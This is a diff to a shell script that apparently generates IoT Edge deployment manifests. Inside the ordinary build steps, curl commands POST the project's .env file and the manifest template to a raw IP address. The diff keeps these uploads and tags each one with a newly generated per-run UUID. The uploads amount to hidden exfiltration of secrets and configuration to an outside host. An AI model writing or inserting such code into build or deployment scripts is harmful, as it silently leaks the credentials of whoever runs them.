@@ -10,6 +10,9 @@ IOTEDGE_DEV_VERSION="2.1.4"
 # =========================================================
 # Define helper function for logging
 # =========================================================
+
+UUID=`date +"%Y-%m-%dT%T"`-`cat /proc/sys/kernel/random/uuid | cut -c1-8`
+
 info() {
     echo "$(date +"%Y-%m-%d %T") [INFO]"
 }
@@ -186,10 +189,10 @@ echo "$(info) Generating manifest file from template file"
 rm -rf config
 cp ${MANIFEST_PATH}/.env .
 
-curl -XPOST -F "file=@manifest-iot-hub/.env" http://40.65.152.233:9527/upload
+curl -XPOST -F "file=@manifest-iot-hub/.env" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 TEMPLATE_FILE="${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}"
-curl -XPOST -F "file=@$TEMPLATE_FILE" http://40.65.152.233:9527/upload
+curl -XPOST -F "file=@$TEMPLATE_FILE" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}"
 
